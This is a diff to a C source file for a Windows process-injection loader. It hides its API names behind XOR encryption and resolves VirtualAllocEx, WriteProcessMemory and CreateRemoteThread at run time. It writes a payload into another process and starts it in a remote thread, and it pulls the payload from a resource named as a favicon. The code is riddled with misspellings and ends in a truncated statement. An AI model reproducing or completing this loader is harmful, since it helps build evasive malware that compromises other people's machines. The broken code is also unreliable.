@@ -3,7 +3,7 @@
 #include <stdlib.h>
 #include <string.h>
 #include <tlhelp32.h>
-//#include "resources.h"
+#include "resources.h"
 
 LPVOID (WINAPI * pVirtualAllocEx)(
     HANDLE hProccess,
@@ -97,9 +97,44 @@ int Inject(HANDLE hProc, unsigned char * payload, unsigned int paylaod_len)
     XOR((char *) sWriteProccessMemory, sizeof(sWriteProccessMemory), KEY,sizeof(KEY));
     XOR((char *) sCreateRemoteThread, sizeof(sCreateRemoteThread), KEY,sizeof(KEY));
     //the handles are now created and they are decrypted now we can continue.
-    pVirtualAllocEx = GetProcAddress(GetModuleHandle("kernel32.dll"),virtualAllocEx);
-    
+    pVirtualAllocEx = GetProcAddress(GetModuleHandle("kernel32.dll"),sVirtualAllocEx);
+    pWriteProccessMemory = GetProcAddress(GetModuleHandle("kernel32.dll"), sWriteProccessMemory);
+    pCreateRemoteThread = GetProcAddress(GetModuleHandle("kernel32.dll"),sCreateRemoteThread);
 
+    pRemoteCode = pVritualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
+    pWriteProccessMemory(hProc,pRemoteCode, (PVOID)payload, (SIZE_T)payload_len,(SIZE_T*)NULL);
+    hThread = pCreateRemoteThread(hProc, NULL, 0, pRemoteCode, NULL, 0, NULL);
+    if(hThread != NULL)
+    {
+        WaifForSingleObject(hThread, 500);
+        CloseHandle(hThread);
+        return 0;
+    }
+    return -1;
+
+
+}
+
+int WINAPI WimMain(HINStANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
+{
+    void * exec_mem;
+    BOOL rv;
+    HANDLE th;
+    DWORD oldprotect = 0;
+    HGLOBAL resHandle = NULL;
+    HRSRC res;
+
+    unsigned char * payload;
+    unsigned int payload_len;
+    res = FindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO),RT_RCDATA);
+    resHandle = LoadResource(NULL, res);
+    payload = (char *) LockResource(resHandle);
+    paytload_len = SizeofResource(NULL, res);
+    exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    RtlMoveMemory(exec_mem, payload, payload_len);
+    int pid = 0;
+    HANDLE hProc = NULL;
+    XOR((char * ))
 
 
 }
